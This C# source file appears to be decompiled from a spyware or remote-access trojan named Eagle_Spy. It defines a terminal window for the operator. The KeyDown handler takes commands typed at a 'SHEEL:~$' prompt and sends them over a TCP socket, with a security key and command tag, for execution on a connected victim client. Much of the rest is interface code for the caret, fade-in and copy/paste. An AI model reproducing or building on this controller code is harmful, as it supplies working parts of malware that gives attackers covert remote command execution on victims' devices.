using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class ShellTerminal : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OutText")]
	private RTB _OutText;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Caret")]
	private Timer _Caret;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem")]
	private ToolStripMenuItem _CopyToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PasteToolStripMenuItem")]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	public Color Color_Default;

	private Rectangle rect;

	private int hidCareat;

	private Size CareatSize;

	private string TAGx;

	public bool ignore;

	public bool IAMNew;

	internal RTB OutText
	;


	internal Timer Caret
	;



	internal Timer TOpacity
	;

	[field: AccessedThroughProperty("PB")]
	internal ProgressBar PB
    ;

    [field: AccessedThroughProperty("ctxMenu")]
	internal ContextMenuStrip ctxMenu
    ;

	internal ToolStripMenuItem CopyToolStripMenuItem
	;

	internal ToolStripMenuItem PasteToolStripMenuItem
	;

	public ShellTerminal()
	{
		base.Load += ShellTerminal_Load;
		Title = "null";
		rect = default(Rectangle);
		hidCareat = -1;
		CareatSize = new Size(6, 12);
		TAGx = "SHEEL:~$";
		ignore = false;
		IAMNew = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.Caret = new System.Windows.Forms.Timer(this.components);
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.PB = new System.Windows.Forms.ProgressBar();
		this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.CopyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.OutText = new Eagle_Spy.RTB();
		this.ctxMenu.SuspendLayout();
		base.SuspendLayout();

        OutText.TextChanged += new EventHandler(OutText_TextChanged);
        OutText.MouseClick += new MouseEventHandler(OutText_MouseClick);
        OutText.KeyDown += new KeyEventHandler(OutText_KeyDown);
        OutText.HScroll += new EventHandler(OutText_HScroll);
        OutText.VScroll += new EventHandler(OutText_VScroll);

        Caret.Tick += new EventHandler(Caret_Tick);

        TOpacity.Tick += new EventHandler(TOpacity_Tick);

        CopyToolStripMenuItem.Click += new EventHandler(CopyToolStripMenuItem_Click);
        PasteToolStripMenuItem.Click += new EventHandler(PasteToolStripMenuItem_Click);

























































        this.Caret.Interval = 500;
		this.TOpacity.Interval = 1;
		this.PB.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.PB.Location = new System.Drawing.Point(0, 231);
		this.PB.Name = "PB";
		this.PB.Size = new System.Drawing.Size(414, 10);
		this.PB.TabIndex = 6;
		this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.CopyToolStripMenuItem, this.PasteToolStripMenuItem });
		this.ctxMenu.Name = "ctxMenu";
		this.ctxMenu.ShowImageMargin = false;
		this.ctxMenu.Size = new System.Drawing.Size(78, 48);
		this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
		this.CopyToolStripMenuItem.Size = new System.Drawing.Size(77, 22);
		this.CopyToolStripMenuItem.Text = "Copy";
		this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
		this.PasteToolStripMenuItem.Size = new System.Drawing.Size(77, 22);
		this.PasteToolStripMenuItem.Text = "Paste";
		this.OutText.BackColor = System.Drawing.Color.Black;
		this.OutText.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.OutText.Dock = System.Windows.Forms.DockStyle.Fill;
		this.OutText.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		this.OutText.Location = new System.Drawing.Point(0, 0);
		this.OutText.Name = "OutText";
		this.OutText.Size = new System.Drawing.Size(414, 231);
		this.OutText.TabIndex = 2;
		this.OutText.Text = "";
		this.OutText.WordWrap = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(414, 241);
		base.Controls.Add(this.OutText);
		base.Controls.Add(this.PB);
		base.Name = "ShellTerminal";
		base.Opacity = 0.0;
		this.Text = "ShellTerminal";
		this.ctxMenu.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void SpyStyle()
	{
		foreach (RichTextBox item in base.Controls.OfType<RichTextBox>())
		{
			item.ForeColor = SpySettings.DefaultColor_Foreground;
			item.BackColor = SpySettings.DefaultColor_Background;
		}
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	private void ShellTerminal_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\15.ico");
		OutText.Font = reso.f;
		Size size = TextRenderer.MeasureText("S", reso.f);
		CareatSize = new Size(checked((int)Math.Round((double)size.Width / 2.0)), size.Height);
		SpyStyle();
		Text = Title;
		OutText.ContextMenuStrip = ctxMenu;
		Color_Default = OutText.ForeColor;
		OutText.TabStop = false;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
		OutText.Focus();
		OutText.Select();
	}

	private void CaretShell(int alva)
	{
		string text = OutText.Text;
		if (text.Length > 0)
		{
			if (!(rect == default(Rectangle)))
				OutText.Invalidate(rect);
			OutText.Update();
			Graphics graphics = OutText.CreateGraphics();
			Point positionFromCharIndex = OutText.GetPositionFromCharIndex(OutText.SelectionStart);
			rect = new Rectangle(positionFromCharIndex.X, positionFromCharIndex.Y, CareatSize.Width, CareatSize.Height);
			int alpha = Color_Default.A;
			if (OutText.SelectionStart != text.Length)
				alpha = alva;
			graphics.FillRectangle(new Pen(Color.FromArgb(alpha, Color_Default.R, Color_Default.G, Color_Default.B), CareatSize.Width).Brush, rect);
			graphics.Dispose();
		}
	}

	private void Caret_Tick(object sender, EventArgs e)
	{
		if (ignore)
			return;
		if (hidCareat == -1)
		{
			if (!(rect == default(Rectangle)))
				OutText.Invalidate(rect);
			hidCareat = 1;
		}
		else
		{
			CaretShell(128);
			hidCareat = -1;
		}
	}

	private void OutText_TextChanged(object sender, EventArgs e)
	{
		if (!IAMNew && OutText.Text.Length == 0)
			NewTag(isLine: false);
		else if (!ignore)
		{
			RestCaret();
		}
	}

	private void OutText_MouseClick(object sender, MouseEventArgs e)
	{
		if (!ignore)
			RestCaret();
	}

	private void OutText_KeyDown(object sender, KeyEventArgs e)
	{
		if ((e.KeyData == Keys.Up) | (e.KeyData == Keys.Down) | (e.KeyData == Keys.Right) | (e.KeyData == Keys.Left))
			e.SuppressKeyPress = true;
		else if ((Control.ModifierKeys == Keys.Shift) | (Control.ModifierKeys == Keys.Control))
		{
			e.SuppressKeyPress = true;
		}
		else
		{
			if (OutText.ReadOnly || ignore)
				return;
			if (e.KeyData == Keys.Return)
			{
				e.SuppressKeyPress = true;
				if (OutText.Lines.Length > 0)
				{
					string text = OutText.Lines[checked(OutText.Lines.Length - 1)];
					if (!text.Contains(TAGx))
					{
						NewTag(isLine: true);
						return;
					}
					text = text.Substring(TAGx.Length);
					if (text.Length == 0)
						return;
					if (classClient != null)
					{
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".terminal" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCommand + Data.SPL_SOCKET + "command" + Data.SPL_DATA + text,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						OutText.ReadOnly = true;
						ignore = true;
						if (!(rect == default(Rectangle)))
							OutText.Invalidate(rect);
						classClient.SendMessage(parametersObjects);
					}
				}
			}
			RestCaret();
		}
	}

	public void NewTag(bool isLine)
	{
		OutText.DeselectAll();
		if (isLine)
		{
			RTB outText = OutText;
			outText.AppendText("\r\n" + TAGx);
			outText = null;
		}
		else
		{
			RTB outText2 = OutText;
			outText2.AppendText(TAGx);
			outText2 = null;
		}
		OutText.SelectionStart = OutText.Text.Length;
	}

	private void RestCaret()
	{
		if (!ignore)
		{
			CaretShell(128);
			Caret.Enabled = false;
			Caret.Enabled = true;
		}
	}

	private void OutText_HScroll(object sender, EventArgs e)
	{
		OutText.Invalidate();
		CaretShell(255);
	}

	private void OutText_VScroll(object sender, EventArgs e)
	{
		OutText.Invalidate();
		CaretShell(255);
	}

	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!OutText.ReadOnly)
			OutText.Paste();
	}

	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		OutText.Copy();
	}
}
